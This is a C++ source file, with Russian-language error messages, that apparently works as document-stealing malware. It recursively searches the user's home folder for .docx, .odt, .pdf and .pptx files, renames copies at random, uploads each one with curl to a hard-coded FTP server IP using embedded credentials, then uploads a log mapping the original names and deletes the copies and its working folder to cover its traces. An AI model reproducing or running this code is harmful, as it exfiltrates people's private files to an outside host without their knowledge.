#include <iostream>
#include <stdlib.h>
#include <filesystem>
#include <unistd.h>
#include <pwd.h>
#include <sys/stat.h>
#include <string>
#include <map>
#include <cstdlib>
#include <fstream>
#include <random>

namespace fs = std::filesystem;
using namespace::std;
std::string get_documents_folder() {
    const char* home = std::getenv("HOME");
    if (!home) {
        std::cerr << "Ошибка: HOME не установлен" << std::endl;
        return "";
    }
    return std::string(home) + "/Documents";
}
std::string gen_random_12() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<long long> dis(100000000000LL, 999999999999LL);
    return std::to_string(dis(gen));
}
std::string find_log_file(const std::string& log_folder) {
    fs::path poly_path = log_folder + "/poly_824";
    if (!fs::exists(poly_path)) {
        fs::create_directories(poly_path);
        return "";
    }
    for (const auto& entry : fs::directory_iterator(poly_path)) {
        std::string filename = entry.path().filename().string();
        if (filename.find("LOGS") == 0) {
            return entry.path().string();
        }
    }
    return "";
}
void send(const std::string& path) {
    if(path.size()>3){
    std::string user = "qweaad000y_input";
    std::string pass = "D%X7RE6eF29SK9XK";
    std::string ftp_server = "77.222.40.198";
    std::string remote_folder = "/";
    std::string command = "curl -T " + path + " ftp://" + user + ":" + pass + "@" + ftp_server + remote_folder + "> /dev/null 2>&1";
    int result = system(command.c_str());
    if (result != 0) {
        std::cerr << "Ошибка отправки файла." << std::endl;
    }}
}
int main() {
    std::string current = get_documents_folder();
    std::string work_path = current.append("/poly_824");
    int result = mkdir(work_path.c_str(), 0777);
    std::string log_folder = work_path;
    struct passwd *pw = getpwuid(geteuid());
    std::string username = pw->pw_name;
    std::cout << "Username: " << username << std::endl;
    string exts[] = {".docx", ".odt", ".pdf", ".pptx"};
    for (auto& p : std::filesystem::recursive_directory_iterator("/home/"+username)) {
        if (!std::filesystem::is_regular_file(p)) continue;
        std::string path_str = p.path().string();
        if (path_str.find("poly_824") != std::string::npos) {
            continue;
        }
        string ext = p.path().extension().string();
        for (string& e : exts) {
            if (ext == e) {
            cout << p.path().string() << endl;
                std::string input_path = p.path().string();
                std::string new_name = gen_random_12();
                fs::path old_path(input_path);
                std::string old_name = old_path.filename().string();
                std::string extension = old_path.extension().string();
                std::string new_path = old_path.parent_path().string() + "/" + new_name + extension;
                std::string log_file_path = find_log_file(log_folder);
                if (log_file_path.empty()) {
                    log_file_path = log_folder + "/poly_824/LOGS" + gen_random_12() + ".txt";
                }
                fs::copy(input_path, new_path, fs::copy_options::overwrite_existing);
                std::ofstream log_file(log_file_path, std::ios::app);
                log_file << old_name << ":" << new_name << extension << ";\n";
                log_file.close();
                send(new_path);
                fs::remove(new_path);
                break;
            }
        }
    }
    std::cout<<find_log_file(log_folder)<<endl;
    send(find_log_file(log_folder));
    fs::remove(find_log_file(log_folder));
    fs::remove_all(work_path);
    return 0;
}
